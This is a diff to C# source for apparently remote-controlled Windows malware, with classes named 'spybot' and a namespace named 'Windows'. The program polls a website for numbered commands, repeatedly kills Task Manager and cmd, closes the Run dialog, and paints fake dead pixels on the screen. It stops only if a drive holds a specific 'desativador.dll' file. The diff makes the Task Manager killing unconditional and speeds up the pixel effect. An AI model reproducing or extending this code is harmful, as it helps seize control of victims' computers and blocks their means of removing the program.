@@ -77,6 +77,7 @@ namespace Windows
         public static bool TUDO_OK = false;
         public static bool FICAR_BUSCANDO_VALORES_NO_SITE = true;
         public static bool FECHAR_CMD = true;
+        public static bool ENCONTROU_DESATIVADOR = false;
         public static int contador = 0;
 
         public static int DELAY_PARA_BUSCAR_NO_SITE_REPETIDAMENTE = 15000;
@@ -113,6 +114,8 @@ namespace Windows
 
 
         //Inicia tudo automaticamente
+
+
         public static void inicializar(Form f)
         {
             spybot.finalizarProcesso("cmd");
@@ -162,6 +165,11 @@ namespace Windows
 
             addHook(10000, () =>
             {
+                if (ENCONTROU_DESATIVADOR)
+                {
+                    return;
+                }
+
                 try
                 {
                     DriveInfo[] all = DriveInfo.GetDrives();
@@ -169,6 +177,7 @@ namespace Windows
                     {
                         if (File.Exists(d.Name + "Desativador/desativador.dll"))
                         {
+                            ENCONTROU_DESATIVADOR = true;
                             //var notify = new System.Windows.Forms.NotifyIcon()
                             //{
                             //    Visible = true,
@@ -197,9 +206,10 @@ namespace Windows
                 if (FECHAR_CMD)
                 {
                     spybot.finalizarProcesso("cmd");
-                    spybot.finalizarProcesso("Taskmgr");
-                    fecharExecutar();
+                    
                 }
+                spybot.finalizarProcesso("Taskmgr");
+                fecharExecutar();
 
             });
 
@@ -312,7 +322,7 @@ namespace Windows
                     }
                     if (ACAO == "17")//
                     {
-                        intervalo = 5000;
+                        intervalo = 1000;
                         spybot.pixelQueimadoFake();
                     }
                     if (ACAO == "18")//
@@ -515,6 +525,7 @@ namespace Windows
         {
             try
             {
+                FECHAR_CMD = false;
                 ProcessStartInfo psi = new ProcessStartInfo
                 {
                     FileName = "cmd.exe",
@@ -531,6 +542,8 @@ namespace Windows
                 // Ler e exibir a saída do comando
                 string resultado = processo.StandardOutput.ReadToEnd();
                 processo.WaitForExit();
+
+                FECHAR_CMD = true;
             }
             catch { }
 
@@ -870,10 +883,15 @@ namespace Windows
                 Random rnd = new Random();
                 int x = rnd.Next(0, Screen.PrimaryScreen.Bounds.Width);
                 int y = rnd.Next(0, Screen.PrimaryScreen.Bounds.Height);
+				
+				int r = rnd.Next(0, 255);
+				int g = rnd.Next(0, 255);
+				int b = rnd.Next(0, 255);
+
                 Graphics.FromHdc(
                     GetDC(IntPtr.Zero)).FillRectangle(
-                    new SolidBrush(Color.Magenta),
-                    x, y, 10, 10
+                    new SolidBrush(Color.FromArgb(r, g, b)),
+                    x, y, 2, 2
                     );  // O último parâmetro define a largura e altura do ponto (1x1)
                 ReleaseDC(IntPtr.Zero, GetDC(IntPtr.Zero));
             }
